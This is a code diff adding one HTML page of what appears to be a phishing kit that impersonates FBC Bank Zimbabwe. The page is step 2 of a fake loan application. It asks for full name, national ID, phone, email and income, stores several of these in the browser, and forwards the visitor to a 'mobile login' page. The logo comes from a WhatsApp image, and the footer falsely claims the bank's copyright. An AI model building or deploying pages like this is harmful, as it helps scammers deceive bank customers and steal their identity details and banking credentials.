@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FBC Bank Zimbabwe - Personal Details</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif; background-color: #0b1f3a; color: #1e293b; margin: 0; }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between p-3 sm:p-6 lg:p-8">
+
+  <div class="w-full max-w-xl mx-auto my-auto bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-100 flex flex-col">
+    <!-- Header with FBC Logo -->
+    <div class="bg-gradient-to-r from-[#004bbd] to-[#003896] px-6 py-6 text-white flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <img src="/assets/aistudio/IMG-20261106-WA0006_9fd08494.jpg" alt="FBC Bank Logo" class="h-10 w-auto rounded-md shadow-xs" onerror="this.src='https://placehold.co/120x50/004bbd/ffffff?text=FBC'" />
+        <div>
+          <span class="text-xs uppercase tracking-widest text-blue-200 block">FBC Bank Zimbabwe</span>
+          <span class="text-base font-bold text-white">Step 2: Personal Details</span>
+        </div>
+      </div>
+      <span class="text-xs bg-white/20 px-3 py-1 rounded-full font-semibold">Page 2 of 5</span>
+    </div>
+
+    <!-- Details Form - All Inputs Completely Blank -->
+    <form id="detailsForm" onsubmit="handleDetailsSubmit(event)" class="p-6 sm:p-8 space-y-4">
+      <h2 class="text-lg font-bold text-slate-800">Applicant Information</h2>
+      <p class="text-xs text-slate-500 -mt-2">Please enter your personal details to proceed with verification.</p>
+
+      <!-- 1. Full Legal Names -->
+      <div>
+        <label class="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Full Legal Names</label>
+        <input type="text" id="fullName" required placeholder="Enter your full legal names" class="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#004bbd]" />
+      </div>
+
+      <!-- 2. National ID / Passport -->
+      <div>
+        <label class="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">National ID / Passport Number</label>
+        <input type="text" id="nationalId" placeholder="e.g. 63-123456-X-42" class="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#004bbd]" />
+      </div>
+
+      <!-- 3. Phone Number -->
+      <div>
+        <label class="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Mobile Phone Number</label>
+        <input type="tel" id="phoneNumber" required placeholder="+263 7X XXX XXXX" class="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#004bbd]" />
+      </div>
+
+      <!-- 4. Email Address -->
+      <div>
+        <label class="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Email Address</label>
+        <input type="email" id="email" placeholder="e.g. name@example.com" class="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#004bbd]" />
+      </div>
+
+      <!-- 5. Loan Purpose -->
+      <div>
+        <label class="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Loan Purpose</label>
+        <select id="loanPurpose" required class="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#004bbd] bg-white">
+          <option value="">-- Select Loan Purpose --</option>
+          <option value="Business Working Capital">Business Working Capital</option>
+          <option value="Home Improvement & Construction">Home Improvement & Construction</option>
+          <option value="School Fees & Tertiary Education">School Fees & Tertiary Education</option>
+          <option value="Solar & Renewable Energy Equipment">Solar & Renewable Energy Equipment</option>
+          <option value="Agricultural Inputs & Irrigation">Agricultural Inputs & Irrigation</option>
+          <option value="Vehicle Purchase & Fleet">Vehicle Purchase & Fleet</option>
+          <option value="Emergency & Medical Expenses">Emergency & Medical Expenses</option>
+          <option value="Personal Consumer Needs">Personal Consumer Needs</option>
+        </select>
+      </div>
+
+      <!-- 6. Monthly Net Income (USD) -->
+      <div>
+        <label class="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Monthly Net Income (USD)</label>
+        <div class="relative">
+          <span class="absolute left-4 top-3 text-sm font-bold text-slate-400">$</span>
+          <input type="number" id="monthlyIncome" required min="1" placeholder="Enter monthly net income" class="w-full pl-8 pr-4 py-3 rounded-xl border border-slate-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#004bbd]" />
+        </div>
+      </div>
+
+      <!-- Actions -->
+      <div class="flex gap-3 pt-4">
+        <a href="index.html" class="w-1/3 py-3.5 border border-slate-300 rounded-full font-bold text-slate-700 text-sm hover:bg-slate-50 text-center transition-colors">
+          &larr; Back
+        </a>
+        <button type="submit" class="w-2/3 py-3.5 bg-[#004bbd] hover:bg-[#003896] text-white rounded-full font-bold text-sm shadow-md transition-all cursor-pointer">
+          Continue to Mobile Login &rarr;
+        </button>
+      </div>
+    </form>
+
+    <!-- Professional Standard Copyright Footer -->
+    <div class="bg-slate-50 px-6 py-4 border-t border-slate-200 text-center text-xs text-slate-500">
+      <p class="font-medium text-slate-700">&copy; 2026 FBC Holdings Limited. All rights reserved.</p>
+      <p class="text-[11px] text-slate-400 mt-0.5">FBC Bank Limited is a registered commercial bank regulated by the Reserve Bank of Zimbabwe.</p>
+    </div>
+  </div>
+
+  <script>
+    function handleDetailsSubmit(e) {
+      e.preventDefault();
+      const phone = document.getElementById('phoneNumber').value;
+      const fullName = document.getElementById('fullName').value;
+      const purpose = document.getElementById('loanPurpose').value;
+      const income = document.getElementById('monthlyIncome').value;
+
+      localStorage.setItem('fbc_phone', phone);
+      localStorage.setItem('fbc_name', fullName);
+      localStorage.setItem('fbc_purpose', purpose);
+      localStorage.setItem('fbc_income', income);
+
+      window.location.href = 'login.html';
+    }
+  </script>
+</body>
+</html>
